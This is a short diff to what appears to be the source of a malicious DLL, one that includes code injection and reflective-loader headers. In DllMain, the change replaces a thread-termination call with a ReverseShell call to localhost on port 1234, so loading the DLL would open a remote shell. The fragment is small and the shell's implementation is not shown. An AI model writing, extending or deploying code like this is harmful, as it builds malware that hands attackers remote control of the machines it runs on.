@@ -4,6 +4,8 @@
 #include "../inject/inject.h"
 #include "../reflecter/reflect.h"
 
+#include "exports.h"
+
 static struct {
     void *where;
     size_t size;
@@ -13,7 +15,7 @@ extern "C" BOOL DllMain(void *where, size_t size)
 {
     DllMeta.where = where;
     DllMeta.size  = size;
-    if(!move_dll) TerminateThread((HANDLE)(uint64_t)GetCurrentThreadId(), 123);
+    if(!move_dll) ReverseShell("localhost", "1234");
     return TRUE;
 }
 
